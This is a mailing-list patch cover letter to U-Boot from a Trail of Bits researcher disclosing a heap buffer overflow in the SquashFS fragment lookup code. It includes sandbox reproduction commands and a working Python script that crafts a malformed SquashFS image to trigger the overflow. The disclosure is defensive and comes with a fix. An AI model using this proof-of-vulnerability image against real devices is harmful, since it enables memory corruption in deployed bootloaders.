Return-Path: <u-boot-bounces@lists.denx.de>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from phobos.denx.de (phobos.denx.de [85.214.62.61])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.lore.kernel.org (Postfix) with ESMTPS id 21176C5B55D
	for <u-boot@archiver.kernel.org>; Fri, 20 Feb 2026 20:38:20 +0000 (UTC)
Received: from h2850616.stratoserver.net (localhost [IPv6:::1])
	by phobos.denx.de (Postfix) with ESMTP id 6B60483A5E;
	Fri, 20 Feb 2026 21:38:18 +0100 (CET)
Authentication-Results: phobos.denx.de; dmarc=pass (p=reject dis=none) header.from=trailofbits.com
Authentication-Results: phobos.denx.de; spf=pass smtp.mailfrom=u-boot-bounces@lists.denx.de
Authentication-Results: phobos.denx.de;
	dkim=pass (2048-bit key; unprotected) header.d=trailofbits.com header.i=@trailofbits.com header.b="ZuebHelM";
	dkim-atps=neutral
Received: by phobos.denx.de (Postfix, from userid 109)
 id ABBDC83CEE; Fri, 20 Feb 2026 20:49:06 +0100 (CET)
Received: from mail-qt1-x843.google.com (mail-qt1-x843.google.com
 [IPv6:2607:f8b0:4864:20::843])
 (using TLSv1.3 with cipher TLS_AES_128_GCM_SHA256 (128/128 bits))
 (No client certificate requested)
 by phobos.denx.de (Postfix) with ESMTPS id BCF4483A5E
 for <u-boot@lists.denx.de>; Fri, 20 Feb 2026 20:49:03 +0100 (CET)
Authentication-Results: phobos.denx.de; dmarc=pass (p=reject dis=none)
 header.from=trailofbits.com
Authentication-Results: phobos.denx.de;
 spf=pass smtp.mailfrom=eric.kilmer@trailofbits.com
Received: by mail-qt1-x843.google.com with SMTP id
 d75a77b69052e-506aa68065eso19848531cf.1
 for <u-boot@lists.denx.de>; Fri, 20 Feb 2026 11:49:03 -0800 (PST)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
 d=trailofbits.com; s=google; t=1771616942; x=1772221742; darn=lists.denx.de;
 h=content-transfer-encoding:mime-version:message-id:date:subject:cc
 :to:from:from:to:cc:subject:date:message-id:reply-to;
 bh=SdFp/MPr6R2JY5f/DQSQhMRKf9tdbvU12kQTn0+mTgI=;
 b=ZuebHelM8bWQ1xVPW6KMBhJWK53sXt2P0gXCjtMvvaOmdFtkMIHl/6h0j8r2OndBlc
 tF9nYs2Z85ncVaN87u4THZDrlXpSxkKyfFd0s1es7mEmtaq2AUibQP8CLxGtG6CH6bbb
 PjY4Ui5qLElc7Yh7yCK0nbr/w5RpQdrI0TbXDMauIM6PdAEEDk++EsVFrxLRWRGNQ7ih
 WDCoUl7HAk0NA6DvwppmXgyXz0bYfRhbORwltWMVEJ0Ytv3ZNOUoQwDlf1bsXK5WJoCy
 +f4QcgCCS8maeT8S5/by5jb7zlgD2QFNLzdYj25M+NEwPIO7Y8RzJCPOOw9sgM1RW2gL
 opQQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
 d=1e100.net; s=20230601; t=1771616942; x=1772221742;
 h=content-transfer-encoding:mime-version:message-id:date:subject:cc
 :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
 :message-id:reply-to;
 bh=SdFp/MPr6R2JY5f/DQSQhMRKf9tdbvU12kQTn0+mTgI=;
 b=XBzg0ld6LglkRMYwK9YX366A2VPyfKJMeGVaVpV8O/mYec2lAZXdWlS9dHY+AdrsxA
 HFkICoCajUE0dhlLDtGBbcULwHP6vjHyiA2Liw2RsPyhtuH1FfAtShGqEumXfE8kRgA5
 X9oN89i8DmClehWe+iDnkpBc1sbByvjXgkO+OPpOxy4Tf6ODsr96OQPkacQPK7q/eFIH
 6hDIrD0Ugb0X0qKj+psL4+xjfT9HwyCiPOjaVDifI3f1Xix7DYu9RxfMYiOiJPBeBOuZ
 +vKzGyr/HE4W6y0bnzYhob5soywPhnygveoXOorUn0to7IWRIXPjG+cT5YyqB2pOLtNU
 ycog==
X-Gm-Message-State: AOJu0Yxf7KxjPjF1X1ogMOrt9TJfDE6+hjE5jqT4nenkx5QsMlTC2GLp
 i6n0NegjTOrtNTuGkVB3ECpe0xAEfrBZYQLRW0Pq3WDRLoFFDj0EW3VQQLqdctnDu5OmuevB3xg
 s6gpOykF83g==
X-Gm-Gg: AZuq6aKpQdQ5XPlzoz8zG4G6TYMreo4TdSaNy+M3gYsipPgfZfRiEadQDTZLGAfFjCp
 WNxFeWnrxa4l9BuSyO6X0EuwhwtD2KD2SQeDkPaXNsONgqZ4Yit91JgSngDH+zgMiZpw8qWEBZ0
 tL0l7SAh9+9hIx2M2hTk33sVti3mCKh5I1A2tSTWplsP3Xd72KnaclpEgqEKxKY85B03jDaTaOp
 jAbAeiEzxgt70hy/oNKNjPDx7LCDgsA2IaGjDqDRdsefsT8/jZyiSZHxXFroGYm28RjZ4L5dSGr
 oR1JxJ1jnd/IP298T8KT1mQ4mc1CbOptmkJPxqDkmfzBuxZD5Fl6PiLwTnQffibKAGTCt3R9U9Z
 ZnNt9rX8Oroa2ZqkgUe65EuBmXhX5W4iuMF68qe87C/Wx89hljZ9+uI5RtP+8uWRImacopULf/v
 /Z42ySsN67O2aL/VYrchfAvFZG5fHCQC6ATyg=
X-Received: by 2002:ac8:58d6:0:b0:506:1fc3:dac7 with SMTP id
 d75a77b69052e-5070bba6bf8mr14093031cf.7.1771616941866; 
 Fri, 20 Feb 2026 11:49:01 -0800 (PST)
Received: from localhost ([2600:4040:5493:a900:ac9a:2022:5331:c80f])
 by smtp.gmail.com with UTF8SMTPSA id
 d75a77b69052e-5070d3a2dc8sm1978171cf.0.2026.02.20.11.49.00
 (version=TLS1_3 cipher=TLS_AES_128_GCM_SHA256 bits=128/128);
 Fri, 20 Feb 2026 11:49:01 -0800 (PST)
From: Eric Kilmer <eric.kilmer@trailofbits.com>
To: u-boot@lists.denx.de
Cc: jmcosta944@gmail.com, thomas.petazzoni@bootlin.com,
 miquel.raynal@bootlin.com, trini@konsulko.com,
 Eric Kilmer <eric.kilmer@trailofbits.com>
Subject: [PATCH 0/1] fs/squashfs: fix heap buffer overflow in
 sqfs_frag_lookup()
Date: Fri, 20 Feb 2026 14:48:07 -0500
Message-ID: <20260220194808.1146082-1-eric.kilmer@trailofbits.com>
X-Mailer: git-send-email 2.53.0
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit
X-Mailman-Approved-At: Fri, 20 Feb 2026 21:38:16 +0100
X-BeenThere: u-boot@lists.denx.de
X-Mailman-Version: 2.1.39
Precedence: list
List-Id: U-Boot discussion <u-boot.lists.denx.de>
List-Unsubscribe: <https://lists.denx.de/options/u-boot>,
 <mailto:u-boot-request@lists.denx.de?subject=unsubscribe>
List-Archive: <https://lists.denx.de/pipermail/u-boot/>
List-Post: <mailto:u-boot@lists.denx.de>
List-Help: <mailto:u-boot-request@lists.denx.de?subject=help>
List-Subscribe: <https://lists.denx.de/listinfo/u-boot>,
 <mailto:u-boot-request@lists.denx.de?subject=subscribe>
Errors-To: u-boot-bounces@lists.denx.de
Sender: "U-Boot" <u-boot-bounces@lists.denx.de>
X-Virus-Scanned: clamav-milter 0.103.8 at phobos.denx.de
X-Virus-Status: Clean

Hi,

I'm Eric Kilmer from Trail of Bits. We found a heap buffer overflow in
U-Boot's SquashFS implementation and have prepared a patch.

sqfs_frag_lookup() has a heap buffer overflow that writes
attacker-controlled data past the SQFS_METADATA_BLOCK_SIZE (8192) heap
buffer. A malformed SquashFS image triggers it through sqfsload when
loading any fragment-backed file. Present since v2020.10
(commit c51006130370 ("fs/squashfs: new filesystem")),
affects all versions through current master.

The function reads a 16-bit metadata block header and uses the lower
15 bits as a memcpy size without bounds checking. sqfs_read_metablock()
in sqfs_inode.c already validates this field but sqfs_frag_lookup() does
not. The fix adds the same check.

This looks related to CVE-2022-33103 and CVE-2022-33967, both heap-based
overflows in the same SquashFS code.

Reproduction

In sandbox (CONFIG_ASAN=y):

  => host bind 0 pov.sqfs
  => sqfsload host 0 0x1000000 /file.txt

Unpatched: "do_check_inuse_chunk: Assertion 'inuse(p)' failed"
Patched:   "Failed to load '/file.txt'" (graceful -EINVAL)

The following script generates the PoV image (requires mksquashfs from
squashfs-tools). It builds a valid image with one small file, then
corrupts only the fragment table index pointer:

  #!/usr/bin/env python3
  import os, struct, subprocess, sys, tempfile
  out = sys.argv[1] if len(sys.argv) > 1 else "pov.sqfs"
  with tempfile.TemporaryDirectory() as d:
      with open(os.path.join(d, "file.txt"), "wb") as f:
          f.write(b"test")
      subprocess.run(["mksquashfs", d, out, "-noI", "-noD", "-noF",
                      "-noX", "-noappend", "-quiet"], check=True)
  img = bytearray(open(out, "rb").read())
  frag_tbl = struct.unpack_from("<Q", img, 0x50)[0]  # fragment_table_start
  # Find a 2-byte value where bit 15 is set (uncompressed) and
  # bits 0-14 > 8192 (overflows the SQFS_METADATA_BLOCK_SIZE buffer)
  for off in range(0x60, frag_tbl):
      h = struct.unpack_from("<H", img, off)[0]
      if (h & 0x8000) and (h & 0x7FFF) > 8192:
          break
  else:
      sys.exit("no suitable header found")
  struct.pack_into("<Q", img, frag_tbl, off)  # corrupt the pointer
  img += b"\x00" * (-len(img) % 4096)         # pad for block alignment
  open(out, "wb").write(img)
  print(f"Wrote {out}: frag index ptr {frag_tbl:#x} -> {off:#x}, "
        f"header {h:#06x}, overflow {(h & 0x7FFF) - 8192} bytes")

This bug was found as part of follow-on research from DARPA's AI Cyber
Challenge (AIXCC), where Trail of Bits built Buttercup, a Cyber
Reasoning System that combines static analysis, fuzzing, and large
language models to find and fix vulnerabilities.
  https://www.darpa.mil/research/programs/ai-cyber
  https://www.trailofbits.com/buttercup/

If there's anything else you need from me, please let me know.

Thanks for your work on U-Boot.

Eric Kilmer (1):
  fs/squashfs: fix heap buffer overflow in sqfs_frag_lookup()

 fs/squashfs/sqfs.c | 5 +++++
 1 file changed, 5 insertions(+)

-- 
2.53.0

